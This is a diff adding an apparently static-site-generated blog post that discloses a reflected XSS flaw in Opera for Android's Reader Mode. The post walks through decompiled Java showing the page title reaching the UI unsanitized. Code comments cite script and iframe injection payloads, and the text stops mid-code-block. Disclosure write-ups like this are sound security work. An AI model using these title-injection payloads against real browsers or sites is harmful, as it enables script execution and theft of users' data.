@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><script src="/writeups/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=writeups/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Cross-Site Scripting in Opera Browser Reader Mode via Malicious &lt;title&gt; Tag (Android) | Neilmark Ochea / 0xnmo</title>
+<meta name="keywords" content="">
+<meta name="description" content="A reflected Cross-Site Scripting (XSS) vulnerability was discovered in Opera Browser for Android’s Reader Mode due to insufficient sanitization of the HTML  tag, allowing attackers to execute arbitrary JavaScript, steal sensitive data, or inject malicious content">
+<meta name="author" content="Me">
+<link rel="canonical" href="http://localhost:1313/writeups/posts/1-opera-browser-mobile-xss/">
+<link crossorigin="anonymous" href="http://localhost:1313/writeups/assets/css/stylesheet.fd5566c526ae48aadabd950798a2dc3568536401560eae5caac3765a42a9e7b5.css" integrity="sha256-/VVmxSauSKravZUHmKLcNWhTZAFWDq5cqsN2WkKp57U=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/writeups/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/writeups/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/writeups/%3Clink%20/%20abs%20url%3E">
+<link rel="apple-touch-icon" href="http://localhost:1313/writeups/%3Clink%20/%20abs%20url%3E">
+<link rel="mask-icon" href="http://localhost:1313/writeups/%3Clink%20/%20abs%20url%3E">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/posts/1-opera-browser-mobile-xss/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="http://localhost:1313/writeups/posts/1-opera-browser-mobile-xss/">
+  <meta property="og:site_name" content="Neilmark Ochea / 0xnmo">
+  <meta property="og:title" content="Cross-Site Scripting in Opera Browser Reader Mode via Malicious Tag (Android)">
+  <meta property="og:description" content="A reflected Cross-Site Scripting (XSS) vulnerability was discovered in Opera Browser for Android’s Reader Mode due to insufficient sanitization of the HTML tag, allowing attackers to execute arbitrary JavaScript, steal sensitive data, or inject malicious content">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-11-16T22:07:33+08:00">
+    <meta property="article:modified_time" content="2025-11-16T22:07:33+08:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Cross-Site Scripting in Opera Browser Reader Mode via Malicious &lt;title&gt; Tag (Android)">
+<meta name="twitter:description" content="A reflected Cross-Site Scripting (XSS) vulnerability was discovered in Opera Browser for Android’s Reader Mode due to insufficient sanitization of the HTML  tag, allowing attackers to execute arbitrary JavaScript, steal sensitive data, or inject malicious content">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://localhost:1313/writeups/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Cross-Site Scripting in Opera Browser Reader Mode via Malicious \u003ctitle\u003e Tag (Android)",
+      "item": "http://localhost:1313/writeups/posts/1-opera-browser-mobile-xss/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Cross-Site Scripting in Opera Browser Reader Mode via Malicious Tag (Android)",
+  "name": "Cross-Site Scripting in Opera Browser Reader Mode via Malicious Tag (Android)",
+  "description": "A reflected Cross-Site Scripting (XSS) vulnerability was discovered in Opera Browser for Android’s Reader Mode due to insufficient sanitization of the HTML tag, allowing attackers to execute arbitrary JavaScript, steal sensitive data, or inject malicious content",
+  "keywords": [
+    
+  ],
+  "articleBody": "Summary A reflected Cross-Site Scripting (XSS) vulnerability was discovered in Opera Browser for Android’s Reader Mode due to insufficient sanitization of the HTML \u003c/code\u003e tag, allowing attackers to execute arbitrary JavaScript, steal sensitive data, or inject malicious content.\n\u003cp\u003eAlthough the Reader Mode engine (\u003ccode\u003eopera-distiller://readermode\u003c/code\u003e) safely distills and sanitizes the \u003cstrong\u003epage body\u003c/strong\u003e, removing scripts and unsafe elements, the \u003cstrong\u003edocument title is extracted much earlier\u003c/strong\u003e, before distillation, by the native HTML parser. This unfiltered title is passed directly into the Java layer and rendered in various UI components without escaping.\n\u003cp\u003eAs a result, an attacker can embed malicious JavaScript directly inside a \u003ccode\u003e\u003ctitle\u003e\u003c/code\u003e tag and have it execute \u003cstrong\u003einside the Reader Mode renderer context\u003c/strong\u003e, even though the body content is sanitized.\n\u003ch3 id=\"root-cause-analysis\"\u003e\u003cstrong\u003eRoot Cause Analysis\u003c/strong\u003e\u003c/h3\u003e \u003cp\u003eThe vulnerability exists in the bridge between native C++ metadata parsing and the Java UI layer, where \u003ccode\u003e\u003ctitle\u003e\u003c/code\u003e content is processed \u003cstrong\u003ewithout any validation or escaping\u003c/strong\u003e.\n\u003ch4 id=\"in-chromiumcontentjava\"\u003e\u003cstrong\u003eIn ChromiumContent.java\u003c/strong\u003e\u003c/h4\u003e \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nd\"\u003e@CalledByNative\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"kd\"\u003epublic\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kd\"\u003estatic\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nf\"\u003ereceivedHtmlMetaData\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eObject\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eobj\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eString\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003estrArr\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eCallback\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003ecallback\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eCallback\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eobj\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estrArr\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e==\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e||\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003estrArr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003elength\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e==\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003emo93a\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eCollections\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eemptyList\u003c/span\u003e\u003cspan class=\"p\"\u003e());\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eArrayList\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003earrayList\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eArrayList\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eHashMap\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003emap\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eHashMap\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003earrayList\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eadd\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emap\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e\u003c\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003estrArr\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003elength\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estrArr\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e==\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003enull\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003emap\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eHashMap\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003earrayList\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eadd\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003emap\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003eelse\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eString\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003estrArr\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c1\"\u003e// ← Metadata key (e.g., \"title\", \"og:title\")\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003emap\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eput\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003estrArr\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c1\"\u003e// ← Raw value from native parser NO sanitization, NO escaping\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c1\"\u003e// → \"\u003cscript\u003ealert(1)\u003c/script\u003e\", \"\u003ciframe src=...\u003e\", etc.\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e++\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003emo93a\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003earrayList\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c1\"\u003e// ← Delivers unsanitized metadata to Java UI layer\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c1\"\u003e// → Used in tab title, address bar, history → XSS in Reader Mode\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e \u003cli\u003eNative C++ parses the \u003cem\u003eraw\u003c/em\u003e HTML document.\u003c/li\u003e \u003cli\u003eIt extracts \u003ccode\u003e\u003ctitle\u003e\u003c/code\u003e and other metadata, then sends them as a key–value list to Java.\u003c/li\u003e \u003cli\u003e\u003cstrong\u003eNo HTML entity encoding\u003c/strong\u003e, \u003cstrong\u003eno script removal\u003c/strong\u003e, and \u003cstrong\u003eno sanitization\u003c/strong\u003e are performed.\u003c/li\u003e \u003cli\u003eThe Java layer later sets this title into UI components using methods like \u003ccode\u003eTextView.setText(title)\u003c/code\u003e, which allow script execution in Reader Mode.\u003c/li\u003e \u003c/ul\u003e \u003ch4 id=\"in-chromiumcontentjava-1\"\u003e\u003cstrong\u003eIn ChromiumContent.java\u003c/strong\u003e\u003c/h4\u003e \u003cul\u003e \u003cli\u003eOpera enforces distillation only for the article body:\u003c/li\u003e \u003c/ul\u003e \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-java\" data-lang=\"java\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eString\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"nf\"\u003ebuildReaderModeUrl\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eString\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003estr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eString\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003estr2\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eUrlMangler\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eBuilder\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\"readermode\"\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"n\"\u003eUri\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eBuilder\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003escheme\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\"opera-distiller\"\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eauthority\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\"readermode\"\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estr2\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan 